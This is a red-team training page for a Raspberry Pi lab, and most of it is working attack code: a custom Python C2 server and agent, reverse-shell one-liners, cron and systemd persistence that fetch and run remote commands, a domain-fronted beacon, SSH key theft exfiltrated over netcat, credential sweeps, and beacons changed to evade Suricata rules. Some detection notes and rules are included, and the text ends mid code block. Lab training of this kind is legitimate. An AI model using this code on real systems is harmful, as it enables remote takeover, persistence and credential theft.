---
layout: training-page
title: "Raspberry Pi C2 & Proxy Lab — Red Team Academy"
module: "IoT Hacking"
tags:
  - raspberry-pi
  - c2
  - pivoting
  - proxy
  - botnet-emulation
  - dns-c2
  - domain-fronting
  - persistence
  - evasion
  - lateral-movement
page_key: "iot-raspberry-pi-c2-lab"
render_with_liquid: false
---

# Raspberry Pi C2 & Proxy Lab

## Overview

A full red team lab built entirely on Raspberry Pis on an isolated home network. Covers proxy chaining, jump box techniques, C2 emulation, credential harvesting, EDR evasion, DNS tunneling, and staged delivery — all using owned hardware. Every section pairs offensive technique with its detection signature.

**Authorization context:** All techniques are scoped to owned devices on an isolated network (`10.0.0.0/24`). Nothing here should be used against systems you do not own or have explicit written authorization to test.

---

## Lab Topology

```
                    ┌─────────────────────────────────────────┐
                    │          ISOLATED LAB NETWORK            │
                    │          (10.0.0.0/24)                   │
                    │                                          │
  ┌──────────────┐  │  ┌──────────────┐  ┌──────────────────┐ │
  │  CONTROLLER  │  │  │   RELAY-1    │  │    RELAY-2       │ │
  │  (Pi 4/8GB)  │  │  │  (Pi 3/4)   │  │    (Pi 3/4)      │ │
  │              │  │  │              │  │                  │ │
  │ - Sliver C2  │◄─┼──│ - Implant    │  │ - Implant        │ │
  │ - frp server │  │  │ - chisel srv │  │ - chisel client  │ │
  │ - HTTP C2    │  │  │ - SOCKS5 fwd │  │                  │ │
  │  10.0.0.10   │  │  │  10.0.0.11   │  │   10.0.0.12      │ │
  └──────────────┘  │  └──────────────┘  └──────────────────┘ │
                    │                                          │
                    │  ┌──────────────┐  ┌──────────────────┐ │
                    │  │   TARGET-1   │  │    TARGET-2       │ │
                    │  │  (Pi Zero/2) │  │    (Pi 3)         │ │
                    │  │ - bare agent │  │  - bare agent     │ │
                    │  │  10.0.0.21   │  │   10.0.0.22       │ │
                    │  └──────────────┘  └──────────────────┘ │
                    └─────────────────────────────────────────┘
```

**Roles:**
- **CONTROLLER** (10.0.0.10) — C2 server, proxy terminus, receives all callbacks
- **RELAY-1/2** (10.0.0.11–12) — proxy intermediaries, traffic hops through these
- **TARGET-1/2** (10.0.0.21–22) — "victim" nodes running implants

---

## Part 0 — Network Reconnaissance

Map the lab before deploying implants.

### Direct Discovery (from CONTROLLER)

```bash
# ARP scan — most reliable on LAN, finds everything including firewalled hosts
sudo arp-scan -l
sudo arp-scan 10.0.0.0/24

# nmap ping sweep with multiple discovery methods
nmap -sn -PE -PP -PS22,80,443 -PA80,443 -PU53,161 10.0.0.0/24 -oG /tmp/hosts_up.gnmap
grep "Up" /tmp/hosts_up.gnmap | awk '{print $2}'

# netdiscover passive (just watches ARP, sends nothing)
sudo netdiscover -p -r 10.0.0.0/24
```

### Port Scan Each Pi

```bash
# Fast top-1000 scan
nmap -sS -T4 --top-ports 1000 -oA /tmp/scans/initial 10.0.0.0/24

# Full port + service version on a specific Pi
nmap -sC -sV -O -p- -T4 --min-rate 1000 -oA /tmp/scans/detailed 10.0.0.21
```

### Scanning Through the Proxy Chain

```bash
# -sT (TCP connect) required through SOCKS — SYN scan needs raw sockets
# -Pn skips ICMP discovery (doesn't work through SOCKS)
proxychains4 nmap -sT -Pn -p22,80,443,8080 10.0.0.0/24
proxychains4 nmap -sT -sV -Pn -p22,80 10.0.0.21
proxychains4 curl http://10.0.0.21:8080
```

### Pi Fingerprinting

```bash
nmap --script ssh2-enum-algos,ssh-auth-methods -p22 10.0.0.21
curl -sI http://10.0.0.21:8080
mkdir -p ~/lab/scans && nmap -sC -sV -oA ~/lab/scans/pi-targets 10.0.0.21 10.0.0.22
```

---

## Part 1 — SSH Tunneling

### Dynamic SOCKS5 Proxy (-D)

```bash
# Create SOCKS5 proxy through RELAY-1 — traffic exits from there
ssh -D 1080 -N -f pi@10.0.0.11

# Route tools through it
curl --socks5-hostname 127.0.0.1:1080 https://ifconfig.io
proxychains4 curl https://ifconfig.io
```

### Local Port Forward (-L)

```bash
# Expose TARGET-1's port 22 as localhost:2222
ssh -L 2222:10.0.0.21:22 -N pi@10.0.0.11
ssh -p 2222 pi@127.0.0.1
```

### Reverse Tunnel (-R)

```bash
# TARGET-1 calls out; CONTROLLER gets a listener on :2222
ssh -R 2222:127.0.0.1:22 -N pi@10.0.0.10
# On CONTROLLER: ssh -p 2222 pi@127.0.0.1
```

### Multi-Hop ProxyJump

```bash
ssh -J pi@10.0.0.11,pi@10.0.0.12 pi@10.0.0.21
```

### ~/.ssh/config Stanza

```
Host relay1
    HostName 10.0.0.11
    User pi
    IdentityFile ~/.ssh/lab_id_ed25519

Host relay2
    HostName 10.0.0.12
    User pi
    ProxyJump relay1

Host target1
    HostName 10.0.0.21
    User pi
    ProxyJump relay1,relay2

Host socks-chain
    HostName 10.0.0.21
    User pi
    ProxyJump relay1,relay2
    DynamicForward 1080
```

---

## Part 2 — Chisel (TCP over HTTP/WebSocket)

Chisel tunnels TCP over HTTP/WebSocket — bypasses firewalls that block raw TCP.

### Install

```bash
# Check arch first: uname -m
# aarch64 = arm64 (Pi 4/5 on 64-bit OS)
# armv7l  = armv7 (Pi 3 on 32-bit OS)

# ARM64
wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_arm64.gz
gunzip chisel_1.11.5_linux_arm64.gz && chmod +x chisel_1.11.5_linux_arm64
sudo mv chisel_1.11.5_linux_arm64 /usr/local/bin/chisel

# ARMv7
wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_armv7.gz
gunzip chisel_1.11.5_linux_armv7.gz && chmod +x chisel_1.11.5_linux_armv7
sudo mv chisel_1.11.5_linux_armv7 /usr/local/bin/chisel
```

### Forward SOCKS5

```bash
# CONTROLLER: accept connections
chisel server --port 9312 --socks5 --reverse

# TARGET-1: connect, creates SOCKS5 on :1080 locally
chisel client 10.0.0.10:9312 socks
curl --socks5-hostname 127.0.0.1:1080 https://ifconfig.io
```

### Reverse SOCKS5 (CONTROLLER gets SOCKS5 exiting via Pi)

```bash
chisel server --port 9312 --reverse
# RELAY-1 calls out; CONTROLLER gets SOCKS5 on :5000 that exits from RELAY-1
chisel client 10.0.0.10:9312 R:5000:socks
```

### Chained Chisel (3 hops)

```bash
# RELAY-1 → CONTROLLER, expose local :9313 there
chisel client 10.0.0.10:9312 R:9313:127.0.0.1:9312

# RELAY-2 → CONTROLLER (via :9313), expose SOCKS5 on CONTROLLER :5000
chisel client 10.0.0.10:9313 R:5000:socks
# Traffic via CONTROLLER:5000 now exits from RELAY-2's network position
```

---

## Part 3 — frp (Fast Reverse Proxy)

More structured than chisel — better for persistent named services.

### Install

```bash
wget https://github.com/fatedier/frp/releases/download/v0.68.1/frp_0.68.1_linux_arm64.tar.gz
tar xzf frp_0.68.1_linux_arm64.tar.gz
sudo cp frp_0.68.1_linux_arm64/frps /usr/local/bin/
sudo cp frp_0.68.1_linux_arm64/frpc /usr/local/bin/
```

### frps.toml (CONTROLLER)

```toml
bindPort = 7000
```

```bash
frps -c /etc/frp/frps.toml
```

### frpc.toml (each Pi — exposes SOCKS5 to controller)

```toml
# RELAY-1
serverAddr = "10.0.0.10"
serverPort = 7000

[[proxies]]
name = "relay1-socks5"
type = "tcp"
remotePort = 6001

[proxies.plugin]
type = "socks5"
```

```toml
# RELAY-2 — different remotePort
serverAddr = "10.0.0.10"
serverPort = 7000

[[proxies]]
name = "relay2-socks5"
type = "tcp"
remotePort = 6002

[proxies.plugin]
type = "socks5"
```

CONTROLLER `:6001` routes via RELAY-1, `:6002` routes via RELAY-2.

---

## Part 4 — Transparent Proxy (iptables + redsocks)

Routes ALL traffic from a Pi through SOCKS5 without modifying each application.

```bash
sudo apt install -y redsocks
```

### /etc/redsocks.conf

```conf
base {
    log_debug = off;
    log_info = on;
    log = "file:/var/log/redsocks.log";
    daemon = on;
    redirector = iptables;
}

redsocks {
    local_ip = 127.0.0.1;
    local_port = 12345;
    ip = 10.0.0.10;
    port = 6001;
    type = socks5;
}
```

### iptables Rules

```bash
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf

sudo iptables -t nat -N REDSOCKS
sudo iptables -t nat -A REDSOCKS -d 0.0.0.0/8 -j RETURN
sudo iptables -t nat -A REDSOCKS -d 10.0.0.0/8 -j RETURN
sudo iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN
sudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN
sudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345
sudo iptables -t nat -A OUTPUT -p tcp -j REDSOCKS
sudo systemctl restart redsocks
```

---

## Part 5 — proxychains4

```bash
sudo apt install -y proxychains4
```

### /etc/proxychains4.conf

```conf
strict_chain
proxy_dns

tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5  10.0.0.11  1080
socks5  10.0.0.12  1080
socks5  10.0.0.10  6001
```

```bash
proxychains4 curl https://ifconfig.io
proxychains4 nmap -sT -Pn 10.0.0.21
proxychains4 ssh pi@10.0.0.21
```

---

## Part 6 — Custom Python C2

### C2 Server

```python
#!/usr/bin/env python3
# c2_server.py
import json, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

AGENTS = {}
TASKS  = {}
LOCK   = threading.Lock()

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass

    def do_GET(self):
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)
        agent_id = qs.get("id", [None])[0]

        if parsed.path == "/beacon" and agent_id:
            with LOCK:
                AGENTS[agent_id] = {
                    "ip": self.client_address[0],
                    "last_seen": time.time(),
                    "hostname": qs.get("h", ["unknown"])[0],
                }
                pending = TASKS.pop(agent_id, [])
            print(f"[+] beacon  id={agent_id[:8]}  tasks={len(pending)}")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"tasks": pending}).encode())
            return

        if parsed.path == "/result" and agent_id:
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length) or "{}")
            with LOCK:
                AGENTS.setdefault(agent_id, {}).setdefault("results", []).append(body)
            print(f"[+] result  id={agent_id[:8]}  output={body.get('output','')[:120]}")
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
            return

        self.send_response(404); self.end_headers()

    def do_POST(self): self.do_GET()

def console(server):
    print("c2> ready. Commands: list | task <id-prefix> <cmd> | results <id-prefix> | quit")
    while True:
        try: line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt): server.shutdown(); break
        if not line: continue
        if line == "list":
            with LOCK:
                for aid, info in AGENTS.items():
                    age = int(time.time() - info.get("last_seen", 0))
                    print(f"  {aid[:8]}  host={info.get('hostname')}  ip={info.get('ip')}  last={age}s")
        elif line.startswith("task "):
            parts = line.split(None, 2)
            if len(parts) == 3:
                prefix, cmd = parts[1], parts[2]
                with LOCK:
                    for aid in [a for a in AGENTS if a.startswith(prefix)]:
                        TASKS.setdefault(aid, []).append(cmd)
                        print(f"  queued for {aid[:8]}: {cmd}")
        elif line.startswith("results "):
            prefix = line.split(None, 1)[1]
            with LOCK:
                for aid, info in [(a, i) for a, i in AGENTS.items() if a.startswith(prefix)]:
                    for r in info.get("results", []):
                        print(f"  {aid[:8]}  cmd={r.get('cmd')}  output={r.get('output','')[:200]}")
        elif line == "quit":
            server.shutdown(); break

if __name__ == "__main__":
    srv = HTTPServer(("0.0.0.0", 8080), C2Handler)
    threading.Thread(target=console, args=(srv,), daemon=True).start()
    print("[*] C2 listening on :8080")
    srv.serve_forever()
```

### Agent

```python
#!/usr/bin/env python3
# agent.py
import hashlib, json, os, platform, random, subprocess, time, urllib.request

C2_HOST          = "http://10.0.0.10:8080"
BEACON_INTERVAL  = 15
JITTER           = 5

_raw     = platform.node() + str(os.getuid())
AGENT_ID = hashlib.sha256(_raw.encode()).hexdigest()
HOSTNAME = platform.node()

def beacon():
    url = f"{C2_HOST}/beacon?id={AGENT_ID}&h={HOSTNAME}"
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return json.loads(r.read()).get("tasks", [])
    except Exception:
        return []

def send_result(cmd, output):
    payload = json.dumps({"cmd": cmd, "output": output}).encode()
    req = urllib.request.Request(
        f"{C2_HOST}/result?id={AGENT_ID}", data=payload,
        headers={"Content-Type": "application/json"}, method="POST")
    try: urllib.request.urlopen(req, timeout=10)
    except Exception: pass

def run_task(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                       timeout=30).decode(errors="replace")
    except subprocess.TimeoutExpired: return "[timeout]"
    except subprocess.CalledProcessError as e: return e.output.decode(errors="replace")

if __name__ == "__main__":
    print(f"[*] agent {AGENT_ID[:8]} starting  host={HOSTNAME}")
    while True:
        for task in beacon():
            send_result(task, run_task(task))
        time.sleep(BEACON_INTERVAL + random.uniform(-JITTER, JITTER))
```

### deploy.sh — Push Agent to All Targets

```bash
#!/usr/bin/env bash
# deploy.sh — patch C2 IP into agent, push + start on all target Pis
# Usage: ./deploy.sh [-c ip] [-p port] [-u user] [-k keyfile] [-t ip,ip | file] [--kill]

set -euo pipefail

C2_IP="10.0.0.10"; C2_PORT="8080"; SSH_USER="pi"
SSH_KEY="${HOME}/.ssh/lab_id_ed25519"; AGENT_SCRIPT="./agent.py"
DEST="/tmp/agent.py"; KILL_MODE=false; TARGETS_ARG=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -c) C2_IP="$2";       shift 2 ;;
        -p) C2_PORT="$2";     shift 2 ;;
        -u) SSH_USER="$2";    shift 2 ;;
        -k) SSH_KEY="$2";     shift 2 ;;
        -t) TARGETS_ARG="$2"; shift 2 ;;
        -s) AGENT_SCRIPT="$2"; shift 2 ;;
        --kill) KILL_MODE=true; shift ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

declare -a TARGETS
if [[ -z "$TARGETS_ARG" ]]; then TARGETS=(10.0.0.21 10.0.0.22)
elif [[ -f "$TARGETS_ARG" ]]; then mapfile -t TARGETS < "$TARGETS_ARG"
else IFS=',' read -ra TARGETS <<< "$TARGETS_ARG"; fi

SSH_OPTS="-i ${SSH_KEY} -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes"

if $KILL_MODE; then
    for ip in "${TARGETS[@]}"; do
        echo -n "  [$ip] "
        ssh $SSH_OPTS "${SSH_USER}@${ip}" "pkill -f agent.py && echo stopped" 2>/dev/null || echo "(none)"
    done; exit 0
fi

[[ ! -f "$AGENT_SCRIPT" ]] && echo "[!] $AGENT_SCRIPT not found" && exit 1
PATCHED="/tmp/agent_patched_$$.py"
sed "s|C2_HOST = .*|C2_HOST = \"http://${C2_IP}:${C2_PORT}\"|" "$AGENT_SCRIPT" > "$PATCHED"
echo "[*] Patched C2_HOST → http://${C2_IP}:${C2_PORT}"
FAILED=()

for ip in "${TARGETS[@]}"; do
    ip="${ip// /}"; [[ -z "$ip" ]] && continue; echo -n "  [$ip] "
    if ! scp $SSH_OPTS "$PATCHED" "${SSH_USER}@${ip}:${DEST}" 2>/dev/null; then
        echo "FAILED (scp)"; FAILED+=("$ip"); continue
    fi
    ssh $SSH_OPTS "${SSH_USER}@${ip}" \
        "pkill -f agent.py 2>/dev/null; chmod +x ${DEST}; nohup python3 ${DEST} >/tmp/agent.log 2>&1 &" 2>/dev/null
    sleep 2
    if ssh $SSH_OPTS "${SSH_USER}@${ip}" "pgrep -f agent.py >/dev/null" 2>/dev/null; then
        echo "OK"; else echo "WARN (deployed, not confirmed)"; fi
done

rm -f "$PATCHED"
echo "[*] Done. ${#FAILED[@]} failed."
[[ ${#FAILED[@]} -gt 0 ]] && echo "[!] Failed: ${FAILED[*]}"
```

```bash
chmod +x deploy.sh
./deploy.sh                                          # default targets
./deploy.sh -t 10.0.0.21,10.0.0.22,10.0.0.23       # custom list
./deploy.sh -t targets.txt -c 10.0.0.10             # from file
./deploy.sh --kill                                   # stop all agents
```

---

## Part 7 — Sliver C2

> **Architecture:** Run the Sliver *server* on an x86 machine. Generate ARM64 implants *for* Pi targets. Running Sliver server on a Pi is possible but slow.

### Install (x86 CONTROLLER)

```bash
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_linux-amd64
chmod +x sliver-server_linux-amd64 sliver-client_linux-amd64
sudo mv sliver-server_linux-amd64 /usr/local/bin/sliver-server
sudo mv sliver-client_linux-amd64 /usr/local/bin/sliver-client
sudo sliver-server   # first run installs deps and generates configs (~2 min)
```

### Generate ARM64 Implant for Pi Targets

```
sliver > http --domain 10.0.0.10 --lport 80

sliver > generate beacon \
    --http 10.0.0.10 \
    --os linux \
    --arch arm64 \
    --format elf \
    --name pi-agent \
    --seconds 15 \
    --jitter 5 \
    --save /tmp/pi-agent

# 32-bit Pi OS: --arch arm
```

```bash
# Deploy to target
scp /tmp/pi-agent pi@10.0.0.21:/tmp/
ssh pi@10.0.0.21 "chmod +x /tmp/pi-agent && /tmp/pi-agent &"
```

### Operate

```
sliver > sessions
sliver > use <session-id>
sliver (pi-agent) > shell
sliver (pi-agent) > ls /
sliver (pi-agent) > download /etc/passwd
```

### Route Sliver Through Chisel

```bash
# RELAY-1: expose Sliver's port 80 via reverse tunnel on CONTROLLER
chisel client 10.0.0.10:9312 R:8080:127.0.0.1:80

# Implant points to RELAY-1 (the hop), not CONTROLLER directly
sliver > generate beacon --http 10.0.0.11:8080 --os linux --arch arm64 ...
```

---

## Part 8 — Mythic C2

> **Hardware requirement:** Pi 4 (8GB) minimum, or x86 machine. Pi 4 (4GB) is marginal — Docker + Mythic needs ~1.5GB free RAM and swaps heavily on SD card. Use a USB SSD.

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo ./install_docker_debian.sh
sudo make
sudo ./mythic-cli start

# Install Poseidon agent (Go-based, ARM64 supported)
sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon
sudo ./mythic-cli start
```

- Web UI: `https://<controller-ip>:7443`
- Credentials printed by `./mythic-cli start`

---

## Part 9 — Detection & Defense Context

### Signature Table

| Technique | Network signature | Detection method |
|---|---|---|
| SSH -D/-L/-R | Persistent SSH, no TTY data, sustained throughput | Long-lived SSH with no shell activity |
| Chisel | HTTP/WebSocket on non-80 port, uniform request sizing | WS upgrade header; periodic uniform-size requests |
| frp | TCP to port 7000, keepalives | Outbound TCP to unfamiliar port with keepalive pattern |
| Python beacon | HTTP GET /beacon?id=... every ~15s | Regular polling interval to same IP |
| Sliver HTTP | HTTP to C2 host, consistent payload size | JA3 fingerprint; HTTP timing regularity |
| proxychains + nmap | TCP connect scan through SOCKS | SOCKS handshakes on relay; many half-open conns |

### Suricata Detection Lab

```bash
sudo apt install -y suricata

cat >> /etc/suricata/rules/lab.rules << 'EOF'
alert http any any -> any any (msg:"CHISEL WebSocket upgrade"; \
    content:"Upgrade: websocket"; http_header; \
    sid:9000001; rev:1;)

alert tcp any any -> any any (msg:"Possible beacon - regular HTTP poll"; \
    content:"GET /beacon"; http_method; \
    threshold: type both, track by_src, count 3, seconds 60; \
    sid:9000002; rev:1;)
EOF

sudo systemctl restart suricata
sudo tail -f /var/log/suricata/fast.log
```

### Traffic Capture

```bash
# Capture all C2 traffic
sudo tcpdump -i eth0 -w ~/lab/capture_$(date +%Y%m%d_%H%M%S).pcap

# Filter to beacon traffic only
sudo tcpdump -i eth0 -w ~/lab/beacons.pcap 'tcp port 8080 and host 10.0.0.10'

# Watch beacon timing live
sudo tcpdump -i eth0 -nn 'tcp port 8080' 2>/dev/null | awk '{print $1, $3, $4}'
```

---

## Part 10 — Living off the Land (LotL)

No uploads, no compiled drops. All techniques use bash, python3, curl, nc, cron, ssh, systemd — pre-installed on Pi OS.

### Reverse Shell One-Liners

```bash
# CONTROLLER listener
nc -lvnp 4444

# TARGET — nc with -e
nc 10.0.0.10 4444 -e /bin/bash

# TARGET — OpenBSD nc (no -e), named pipe
rm -f /tmp/.f; mkfifo /tmp/.f
cat /tmp/.f | /bin/bash -i 2>&1 | nc 10.0.0.10 4444 > /tmp/.f

# Pure bash — no nc required
bash -i >& /dev/tcp/10.0.0.10/4444 0>&1
exec 5<>/dev/tcp/10.0.0.10/4444; bash <&5 >&5 2>&5

# python3
python3 -c "
import socket,subprocess,os
s=socket.socket(); s.connect(('10.0.0.10',4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
"
```

> **Detection:** `ss -tp` shows the connection. `ausearch -c bash` catches `/dev/tcp` if auditd is running.

### Cron Beacon

```bash
# /etc/cron.d/updater (root, 644)
* * * * * root TASK=$(curl -sf http://10.0.0.10:8080/task.txt) && OUTPUT=$(eval "$TASK" 2>&1) && curl -sf -X POST http://10.0.0.10:8080/result --data-urlencode "out=$OUTPUT" >/dev/null 2>&1
```

### Pure Bash Beacon Loop

```bash
#!/bin/bash
# beacon.sh — bash + curl only
C2="http://10.0.0.10:8080"
while true; do
    TASK=$(curl -sf --max-time 10 "${C2}/task.txt" 2>/dev/null)
    if [[ -n "$TASK" && "$TASK" != "NOP" ]]; then
        OUTPUT=$(eval "$TASK" 2>&1)
        BEACON_ID=$(hostname)_$(cat /sys/class/net/eth0/address 2>/dev/null | tr -d ':')
        curl -sf -X POST "${C2}/result" \
             --data-urlencode "id=${BEACON_ID}" \
             --data-urlencode "out=${OUTPUT}" \
             --max-time 10 >/dev/null 2>&1
    fi
    sleep $(( 30 + RANDOM % 15 ))
done
```

```bash
nohup bash /tmp/.beacon.sh >/dev/null 2>&1 & disown
```

### SSH authorized_keys Abuse

```bash
ssh-keygen -t ed25519 -f ~/.ssh/lab_persist -N "" -C "update-agent"

# On TARGET
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "$(cat ~/.ssh/lab_persist.pub)" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Python3 In-Memory Task Fetch

```bash
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://10.0.0.10:8080/task.py').read())"
```

### systemd Persistence (root)

```bash
cat > /etc/systemd/system/network-keepalive.service <<'EOF'
[Unit]
Description=Network Keep-Alive Service
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.10/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable network-keepalive.service
systemctl start network-keepalive.service
```

---

## Part 11 — Traffic Blending & Domain Fronting

### What Domain Fronting Is

```
RELAY-1 TLS ClientHello:  SNI = "legit-site.com"     (visible to network)
HTTP Host header (inside TLS): Host: c2.lab           (invisible to network)

nginx on CONTROLLER routes on the Host header → C2 backend
Defender sees: connection to "legit-site.com"
```

### nginx Proxy (Lab CDN Simulation)

```bash
sudo apt install -y nginx openssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/legit-site.key \
  -out /etc/ssl/certs/legit-site.crt \
  -subj "/CN=legit-site.com"
```

`/etc/nginx/sites-available/fronting-lab`:

```nginx
server {
    listen 443 ssl;
    server_name legit-site.com;
    ssl_certificate     /etc/ssl/certs/legit-site.crt;
    ssl_certificate_key /etc/ssl/private/legit-site.key;
    location / { return 200 "Welcome\n"; add_header Content-Type text/plain; }
}
server {
    listen 443 ssl;
    server_name c2.lab;
    ssl_certificate     /etc/ssl/certs/legit-site.crt;
    ssl_certificate_key /etc/ssl/private/legit-site.key;
    location /task.txt { proxy_pass http://127.0.0.1:8080/task.txt; }
    location /result   { proxy_pass http://127.0.0.1:8080/result; proxy_pass_request_body on; }
}
```

```bash
sudo ln -sf /etc/nginx/sites-available/fronting-lab /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
echo "10.0.0.10  legit-site.com" | sudo tee -a /etc/hosts
echo "10.0.0.10  c2.lab"         | sudo tee -a /etc/hosts
```

### Fronted Beacon

```python
#!/usr/bin/env python3
# beacon_fronted.py — SNI=legit-site.com, Host=c2.lab
import ssl, socket, http.client, urllib.parse, time, random, subprocess, platform

PROXY_IP = "10.0.0.10"; PROXY_PORT = 443
SNI_HOST = "legit-site.com"; C2_HOST = "c2.lab"

def _tls():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((PROXY_IP, PROXY_PORT), timeout=10)
    return ctx.wrap_socket(raw, server_hostname=SNI_HOST)

def fetch_task():
    conn = http.client.HTTPSConnection(PROXY_IP, PROXY_PORT,
                                       context=ssl.create_default_context())
    conn.sock = _tls()
    conn.request("GET", "/task.txt", headers={"Host": C2_HOST, "User-Agent": "curl/7.74.0"})
    return conn.getresponse().read().decode().strip()

def post_result(out):
    body = urllib.parse.urlencode({"id": platform.node(), "out": out})
    conn = http.client.HTTPSConnection(PROXY_IP, PROXY_PORT,
                                       context=ssl.create_default_context())
    conn.sock = _tls()
    conn.request("POST", "/result", body=body,
                 headers={"Host": C2_HOST, "Content-Type": "application/x-www-form-urlencoded"})
    conn.getresponse()

while True:
    try:
        task = fetch_task()
        if task and task != "NOP":
            out = subprocess.check_output(task, shell=True,
                                          stderr=subprocess.STDOUT, timeout=30).decode()
            post_result(out)
    except Exception: pass
    time.sleep(30 + random.randint(0, 15))
```

### JA3 Fingerprinting

```bash
sudo tshark -i eth0 -f "tcp port 443" \
  -Y "tls.handshake.type == 1" \
  -T fields \
  -e ip.src -e tls.handshake.ja3 -e tls.handshake.extensions_server_name 2>/dev/null
```

Python's `ssl` module has a distinct JA3 hash — it matches no known browser. Cross-reference against `ja3er.com` or Salesforce JA3 database.

---

## Part 12 — Credential Harvesting & Lateral Movement

### SSH Key Harvesting

```bash
find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
cat /home/pi/.ssh/id_ed25519
cat /home/pi/.ssh/known_hosts
ssh-keygen -F 10.0.0.22   # confirm host is in known_hosts

# Exfil via nc
# CONTROLLER: nc -lvp 4444 > stolen_key
cat /home/pi/.ssh/id_ed25519 | nc 10.0.0.10 4444
```

### bash_history Mining

```bash
grep -iE "(password|passwd|token|secret|key|curl.*-u|mysql.*-p)" /home/pi/.bash_history
for f in /home/*/.bash_history /root/.bash_history; do echo "=== $f ==="; cat "$f" 2>/dev/null; done
```

### Config File Sweep

```bash
grep -i "psk\|ssid\|password" /etc/wpa_supplicant/wpa_supplicant.conf
find / -name ".env" -not -path "*/proc/*" 2>/dev/null
grep -rE "(password|passwd|secret|token|api_key)\s*[=:]" \
    /home/pi/ /etc/ --include="*.conf" --include="*.env" --include="*.py" \
    --include="*.json" 2>/dev/null | grep -v "Binary file"
```

### Pivot with Stolen Key

```bash
chmod 600 stolen_id_ed25519
ssh -i stolen_id_ed25519 -o StrictHostKeyChecking=no pi@10.0.0.22

# Sweep the subnet
for ip in 10.0.0.{1..254}; do
    ssh -i stolen_id_ed25519 -o StrictHostKeyChecking=no \
        -o ConnectTimeout=2 -o BatchMode=yes \
        pi@$ip "hostname && id" 2>/dev/null && echo "SUCCESS: $ip"
done
```

> **Detection:** `/var/log/auth.log` on TARGET-2 shows source `10.0.0.21` (not the controller), revealing the lateral movement hop.

### SSH Agent Forwarding Abuse

```bash
eval $(ssh-agent) && ssh-add ~/.ssh/id_ed25519
ssh -A pi@10.0.0.21           # forward agent to TARGET-1
# On TARGET-1: agent socket forwarded, keys usable without being on disk
ssh pi@10.0.0.22              # authenticates using CONTROLLER's key

# If another admin left a forwarded session, abuse their socket
find /tmp -name "agent.*" 2>/dev/null
export SSH_AUTH_SOCK=/tmp/ssh-XYZabc/agent.1234
ssh pi@10.0.0.22              # use victim's keys
```

---

## Part 13 — EDR/IDS Evasion Fundamentals

Three write-then-break rounds. Each round: write a Suricata rule, modify the beacon to defeat it.

### Round 1 — URI Pattern

**Rule v1 — detect `/beacon` URI:**
```
alert http $HOME_NET any -> $EXTERNAL_NET 8080 (
    msg:"C2 Beacon URI"; flow:established,to_server;
    http.method; content:"GET"; http.uri; content:"/beacon";
    threshold:type threshold, track by_src, count 3, seconds 60;
    sid:9000001; rev:1;)
```

**Beacon v2 — randomize URI, increase jitter:**
```python
import time, requests, random, string
C2 = "http://10.0.0.10:8080"
def rpath(n=8): return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))
while True:
    try:
        r = requests.get(f"{C2}/{rpath()}", params={"t": rpath(4)})
        if r.text.strip():
            result = __import__('subprocess').getoutput(r.text.strip())
            requests.post(f"{C2}/{rpath()}", data=result)
    except Exception: pass
    time.sleep(random.randint(45, 135))   # avg below 3-in-60s threshold
```

### Round 2 — User-Agent Detection

**Rule v2 — python-requests UA:**
```
alert http $HOME_NET any -> 10.0.0.10 8080 (
    msg:"Python-requests UA"; flow:established,to_server;
    http.user_agent; content:"python-requests"; sid:9000004; rev:1;)
```

**Beacon v3 — spoof Chrome UA:**
```python
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
    "Referer": "https://www.google.com/",
}
```

### Round 3 — Payload Pattern + HTTPS

**Rule v3 — base64 blob in POST:**
```
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Base64 POST Exfil"; flow:established,to_server;
    http.method; content:"POST";
    http.request_body; pcre:"/^[A-Za-z0-9+\/]{64,}={0,2}$/m";
    sid:9000006; rev:1;)
```

**Beacon v4 — HTTPS + JSON-wrapped base64:**
```python
import time, requests, random, base64, json
from urllib3.exceptions import InsecureRequestWarning
